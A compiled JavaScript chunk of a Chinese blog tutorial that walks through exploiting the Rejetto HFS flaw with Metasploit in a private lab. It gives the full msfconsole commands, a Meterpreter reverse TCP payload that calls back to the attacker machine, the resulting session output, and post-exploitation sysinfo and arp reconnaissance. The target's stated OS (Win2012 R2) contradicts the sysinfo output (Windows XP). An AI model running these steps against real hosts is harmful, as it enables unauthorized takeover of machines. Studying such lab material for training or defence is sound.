(window.webpackJsonp=window.webpackJsonp||[]).push([[405],{701:function(s,e,n){"use strict";n.r(e);var t=n(7),a=Object(t.a)({},(function(){var s=this,e=s._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"使用metasploit获取目标的控制权限"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#使用metasploit获取目标的控制权限"}},[s._v("#")]),s._v(" 使用Metasploit获取目标的控制权限")]),s._v(" "),e("p",[s._v("攻击机： Kali 192.168.175.128")]),s._v(" "),e("p",[s._v("靶机： Win2012 R2 192.168.175.130")]),s._v(" "),e("p",[s._v("在上一篇《"),e("a",{attrs:{href:"https://blog.csdn.net/l1028386804/article/details/86567192",target:"_blank",rel:"noopener noreferrer"}},[s._v("对威胁建模(附加搭建CVE:2014-6287漏洞环境"),e("OutboundLink")],1),s._v(")》中，我们确定了目标系统的漏洞和Metasploit的可利用模块，接下来我们就真正获取目标的控制权限。")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("msfconsole\nuse exploit/windows/http/rejetto_hfs_exec\nset RHOST 192.168.175.130\nset RPORT 8080\nset payload windows/meterpreter/reverse_tcp\nset LHOST 192.168.175.128\nexploit\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br")])]),e("p",[s._v("具体操作如下：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("msf5 > use exploit/windows/http/rejetto_hfs_exec \nmsf5 exploit(windows/http/rejetto_hfs_exec) > set RHOST 192.168.175.130\nRHOST => 192.168.175.130\nmsf5 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080\nRPORT => 8080\nmsf5 exploit(windows/http/rejetto_hfs_exec) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf5 exploit(windows/http/rejetto_hfs_exec) > set LHOST 192.168.175.128\nLHOST => 192.168.175.128\nmsf5 exploit(windows/http/rejetto_hfs_exec) > show options\n\nModule options (exploit/windows/http/rejetto_hfs_exec):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   HTTPDELAY  10               no        Seconds to wait before terminating web server\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     192.168.175.130  yes       The target address range or CIDR identifier\n   RPORT      8080             yes       The target port (TCP)\n   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT    8080             yes       The local port to listen on.\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\n   TARGETURI  /                yes       The path of the web application\n   URIPATH                     no        The URI to use for this exploit (default is random)\n   VHOST                       no        HTTP server virtual host\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     192.168.175.128  yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\nmsf5 exploit(windows/http/rejetto_hfs_exec) > exploit\n\n[*] Started reverse TCP handler on 192.168.175.128:4444 \n[*] Using URL: http://0.0.0.0:8080/OHqKAjyg9dj9u\n[*] Local IP: http://192.168.175.128:8080/OHqKAjyg9dj9u\n[*] Server started.\n[*] Sending a malicious request to /\n[*] Payload request received: /OHqKAjyg9dj9u\n[*] Sending stage (179779 bytes) to 192.168.175.130\n[*] Meterpreter session 1 opened (192.168.175.128:4444 -> 192.168.175.130:1091) at 2019-01-23 11:32:15 +0800\n[!] Tried to delete %TEMP%\\OmpsEelxzVs.vbs, unknown result\n[*] Server stopped.\n\nmeterpreter > \n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br"),e("span",{staticClass:"line-number"},[s._v("31")]),e("br"),e("span",{staticClass:"line-number"},[s._v("32")]),e("br"),e("span",{staticClass:"line-number"},[s._v("33")]),e("br"),e("span",{staticClass:"line-number"},[s._v("34")]),e("br"),e("span",{staticClass:"line-number"},[s._v("35")]),e("br"),e("span",{staticClass:"line-number"},[s._v("36")]),e("br"),e("span",{staticClass:"line-number"},[s._v("37")]),e("br"),e("span",{staticClass:"line-number"},[s._v("38")]),e("br"),e("span",{staticClass:"line-number"},[s._v("39")]),e("br"),e("span",{staticClass:"line-number"},[s._v("40")]),e("br"),e("span",{staticClass:"line-number"},[s._v("41")]),e("br"),e("span",{staticClass:"line-number"},[s._v("42")]),e("br"),e("span",{staticClass:"line-number"},[s._v("43")]),e("br"),e("span",{staticClass:"line-number"},[s._v("44")]),e("br"),e("span",{staticClass:"line-number"},[s._v("45")]),e("br"),e("span",{staticClass:"line-number"},[s._v("46")]),e("br"),e("span",{staticClass:"line-number"},[s._v("47")]),e("br"),e("span",{staticClass:"line-number"},[s._v("48")]),e("br"),e("span",{staticClass:"line-number"},[s._v("49")]),e("br"),e("span",{staticClass:"line-number"},[s._v("50")]),e("br"),e("span",{staticClass:"line-number"},[s._v("51")]),e("br"),e("span",{staticClass:"line-number"},[s._v("52")]),e("br"),e("span",{staticClass:"line-number"},[s._v("53")]),e("br"),e("span",{staticClass:"line-number"},[s._v("54")]),e("br"),e("span",{staticClass:"line-number"},[s._v("55")]),e("br"),e("span",{staticClass:"line-number"},[s._v("56")]),e("br"),e("span",{staticClass:"line-number"},[s._v("57")]),e("br"),e("span",{staticClass:"line-number"},[s._v("58")]),e("br")])]),e("p",[s._v("执行完后，我们就获得了目标主机的控制权。")]),s._v(" "),e("p",[s._v("接下来，我们看看内网中有没有其他主机，如下所示：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("meterpreter > sysinfo\nComputer        : LIUYAZHUANG\nOS              : Windows XP (Build 2600, Service Pack 3).\nArchitecture    : x86\nSystem Language : zh_CN\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter > \nmeterpreter > arp\n\nARP cache\n=========\n\n    IP address       MAC address        Interface\n    ----------       -----------        ---------\n    192.168.175.2    00:50:56:e7:f5:30  2\n    192.168.175.128  00:0c:29:68:65:5b  2\n    192.168.175.131  00:0c:29:cf:f6:ac  2\n\nmeterpreter > \n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br")])]),e("p",[s._v("可以看到内网中有一台192.168.175.131的主机。")]),s._v(" "),e("h2",{attrs:{id:"写在最后"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),e("blockquote",[e("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);e.default=a.exports}}]);